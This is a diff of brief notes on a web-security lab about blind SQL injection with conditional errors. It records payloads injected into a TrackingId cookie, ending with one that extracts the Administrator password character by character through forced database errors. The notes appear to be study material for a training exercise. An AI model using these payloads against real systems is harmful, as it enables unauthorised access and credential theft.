@@ -1,8 +1,19 @@
 Lab #12: Blind SQL injection with conditional errors
 
+Verify that an error message is received. 
+Internal Server Error
+TrackingId=xyz'
+
+Fixing the query
+'--       --{ 200 OK
+''        --{200 OK, two single quotes
+
+
 
 Getting no error. 200 OK
 ' and (select case when (1=2) then to_char(1/0) else 'a' END from dual)='a
 
 500 internal server error
 ' and (select case when (1=1) then to_char(1/0) else 'a' END from dual)='a
+
+Cookie: TrackingId=ZC9QkGN4YpN2rQTh' and (select case when (username = 'Administrator' and SUBSTR(Password, 1, 1) > 'a') then to_char(1/0) else 'b' END from users)='a
